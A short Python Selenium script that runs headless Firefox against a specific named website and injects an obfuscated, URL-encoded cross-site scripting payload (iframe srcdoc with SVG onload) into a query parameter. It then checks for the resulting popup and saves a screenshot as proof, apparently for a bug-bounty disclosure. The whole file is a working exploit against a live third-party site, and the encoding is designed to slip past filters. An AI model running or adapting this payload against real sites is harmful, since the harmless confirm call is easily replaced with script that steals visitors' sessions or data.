from selenium import webdriver
from selenium.webdriver.firefox.options import Options

options=Options()
options.headless = True
driver = webdriver.Firefox(options=options, executable_path = r'/root/Desktop/Automation/HedlessBrowser/Bin/geckodriver')
driver.get("""http://www.bassawards.org/winners.php?agno='"--!></Iframe><Iframe /SrcDoc=%26lt;Svg/O%26%23x6Eload%26equals;confirm%26lpar;/OPENBUGBOUNTY/%26rpar;%26gt;>""")
alert=driver.switch_to_alert()
if alert:
    print("POP UP")
    alert.accept()
    driver.save_screenshot('/root/Desktop/Automation/HedlessBrowser/pop.png')

print("Headless Browser")
driver.quit()
